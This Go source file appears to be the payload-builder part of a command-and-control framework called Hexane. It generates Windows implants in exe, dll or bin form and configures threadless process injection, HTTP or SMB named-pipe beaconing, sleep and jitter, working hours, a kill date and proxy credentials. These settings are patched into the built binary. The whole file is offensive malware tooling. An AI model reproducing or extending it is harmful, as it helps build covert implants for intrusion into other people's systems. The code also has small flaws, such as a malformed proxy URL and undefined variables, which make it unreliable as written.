package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strconv"
	"strings"
)

const (
	TRANSPORT_HTTP = 1
	TRANSPORT_PIPE = 2

	Fstat = os.O_WRONLY | os.O_CREATE | os.O_TRUNC

	Logs        = "../logs/"
	PayloadPath = "../payload"
	StringsFile = "../configs/strings.txt"
	HashHeader  = "../core/include/names.hpp"
	RsrcScript  = "../loader/resource.rc"
	LoadersCpp  = "../loader/loaders.cpp"
	LoaderDll   = "../loader/DllMain.cpp"
	MainExe     = "../core/implant/MainExe.cpp"
	Ld          = "../implant/linker.implant.ld"
)

var RequiredMods = []string{
	"iphlpapi",
	"advapi32",
	"winhttp",
	"crypt32",
	".reloc",
}

func (h *HexaneConfig) CreateConfig(jsn JsonConfig) error {
	var err error

	h.Compiler = new(CompilerConfig)
	h.Implant = new(ImplantConfig)

	h.BuildType = jsn.Config.BuildType
	h.ImplantName = jsn.ImplantName

	switch h.BuildType {
	case "bin":
		{
			h.Compiler.FileExtension = ".bin"
		}
	case "dll":
		{
			h.Compiler.FileExtension = ".dll"
		}
	case "exe":
		{
			h.Compiler.FileExtension = ".exe"
		}
	default:
		err = fmt.Errorf("unkown build type. Exiting")
	}

	h.Compiler.BuildDirectory = fmt.Sprintf("../payload/%s", strings.TrimSuffix(h.ImplantName, h.Compiler.FileExtension))
	WrapMessage("INF", fmt.Sprintf("generating config for %s", h.Compiler.FileExtension))

	h.Compiler.Debug = jsn.Config.Debug
	h.Compiler.Arch = jsn.Config.Arch
	h.Compiler.Mingw = "/usr/bin/x86_64-w64-mingw32-g++"
	h.Compiler.Linker = "/usr/bin/x86_64-w64-mingw32-ld"
	h.Compiler.Objcopy = "/usr/bin/x86_64-w64-mingw32-objcopy"
	h.Compiler.RsrcCompiler = "/usr/bin/x86_64-w64-mingw32-windres"
	h.Compiler.Strip = "/usr/bin/x86_64-w64-mingw32-strip"
	h.Compiler.Assembler = "/usr/bin/nasm"

	h.Compiler.IncludeDirs = []string{
		"../core/include",
	}

	h.Compiler.ComponentDirs = []string{
		"../core/src",
		"../implant",
	}

	h.Implant.LoadedModules = []string{
		"crypt32",
		"winhttp",
		"advapi32",
		"iphlpapi",
		".reloc",
	}

	if jsn.Config.Debug {
		h.Compiler.Flags = []string{
			"",
			"-std=c++23",
			"-g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1",
			"-Wl,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	} else {
		h.Compiler.Flags = []string{
			"",
			"-std=c++23",
			"-Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-s -ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1",
			"-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	}

	return err
}

func ReadConfig(file string) error {
	var (
		h, peer *HexaneConfig
		jsn     JsonConfig
		buf     []byte
		err     error
	)

	WrapMessage("INF", fmt.Sprintf("loading %s.json", file))
	h = new(HexaneConfig)

	if buf, err = os.ReadFile(cwd + "/../configs/" + file + ".json"); err != nil {
		return err
	}
	if err = json.Unmarshal(buf, &jsn); err != nil {
		return err
	}
	if err = h.CreateConfig(jsn); err != nil {
		return err
	}

	h.Implant.Peer = jsn.Config.Peer
	if h.Implant.Peer != "" {
		h.GroupId = GetGIDByPeerName(h.Implant.Peer)
	} else {
		Payloads.Group++
		h.GroupId = Payloads.Group
	}

	h.Implant.IngressPipe = GenerateUuid(24)
	if h.Implant.PeerId = GeneratePeerId(); h.Implant.PeerId == 0 {
		return err
	}

	h.Implant.Sleeptime = uint32(jsn.Config.Sleeptime)
	h.Implant.Jitter = uint32(jsn.Config.Jitter)
	h.Implant.Domain = jsn.Network.Domain

	if h.Implant.Hostname = jsn.Config.Hostname; h.Implant.Hostname == "" {
		return fmt.Errorf("a hostname must be provided")
	}

	h.Implant.Injection = new(Injection)
	if jsn.Injection.Threadless != nil {
		h.Implant.Injection.Threadless = new(Threadless)
		h.Implant.Injection.Threadless.ModuleName = jsn.Injection.Threadless.ModuleName + string(byte(0x00))
		h.Implant.Injection.Threadless.ProcName = jsn.Injection.Threadless.ProcName + string(byte(0x00))
		h.Implant.Injection.Threadless.FuncName = jsn.Injection.Threadless.FuncName + string(byte(0x00))
		h.Implant.Injection.Threadless.LdrExecute = jsn.Injection.Threadless.LdrExecute
	}

	if jsn.Network.ProfileType == "http" {

		h.Implant.Profile = new(HttpConfig)
		h.Implant.ProfileTypeId = TRANSPORT_HTTP

		Profile := h.Implant.Profile.(*HttpConfig)
		Profile.Address = jsn.Network.Address
		Profile.Port = jsn.Network.Port
		Profile.Useragent = jsn.Network.Useragent

		if jsn.Network.Port < 1 || jsn.Network.Port > 65535 {
			return fmt.Errorf("port number must be between 1 - 65535")
		}

		Profile.Endpoints = make([]string, 0, len(jsn.Network.Endpoints))
		Profile.Endpoints = append(Profile.Endpoints, jsn.Network.Endpoints...)

		h.Proxy = new(ProxyConfig)

		if jsn.Network.Proxy.Enabled {
			if jsn.Network.Proxy.Port < 1 || jsn.Network.Proxy.Port > 65535 {
				return errors.New("proxy port number must be between 1 - 65535")
			}

			h.Implant.bProxy = true
			h.Proxy.Proto = "http://"
			h.Proxy.Address = jsn.Network.Proxy.Address
			h.Proxy.Port = strconv.Itoa(int(jsn.Network.Proxy.Port))
		}
	} else if jsn.Network.ProfileType == "smb" {

		h.Implant.ProfileTypeId = TRANSPORT_PIPE

		if peer = GetPeerNameByGID(h.GroupId); peer != nil {
			h.Implant.EgressPipe = peer.Implant.IngressPipe
		}
	}

	h.UserSession = s
	return h.Run()
}

func (h *HexaneConfig) PePatchConfig() ([]byte, error) {
	var (
		hStream = CreateStream()
		Hours   int32
		err     error
	)

	if Hours, err = ParseWorkingHours(h.Implant.WorkingHours); err != nil {
		return nil, err
	}

	hStream.AddBytes(h.Key)
	hStream.AddString(h.Implant.Hostname)
	hStream.AddString(h.Implant.Domain)
	hStream.AddWString(h.Implant.IngressPipe)
	hStream.AddDword(h.Implant.PeerId)
	hStream.AddDword(h.Implant.Sleeptime)
	hStream.AddDword(h.Implant.Jitter)
	hStream.AddInt32(Hours)
	hStream.AddDword64(h.Implant.Killdate)

	switch h.Implant.ProfileTypeId {
	case TRANSPORT_HTTP:
		{
			var Config = h.Implant.Profile.(*HttpConfig)

			hStream.AddWString(Config.Useragent)
			hStream.AddWString(Config.Address)
			hStream.AddDword(uint32(Config.Port))

			if len(Config.Endpoints) == 0 {
				hStream.AddDword(1)
				hStream.AddWString("/")

			} else {
				hStream.AddDword(uint32(len(Config.Endpoints)))
				for _, uri := range Config.Endpoints {
					hStream.AddWString(uri)
				}
			}
			if h.Implant.bProxy {
				var ProxyUrl = fmt.Sprintf("%v://%v:%v", h.Proxy.Proto, h.Proxy.Address, h.Proxy.Port)

				hStream.AddDword(1)
				hStream.AddWString(ProxyUrl)
				hStream.AddWString(h.Proxy.Username)
				hStream.AddWString(h.Proxy.Password)
			} else {
				hStream.AddDword(0)
			}
			break
		}
	case TRANSPORT_PIPE:
		{
			hStream.AddWString(h.Implant.EgressPipe)
		}
	}
	return hStream.Buffer, err
}
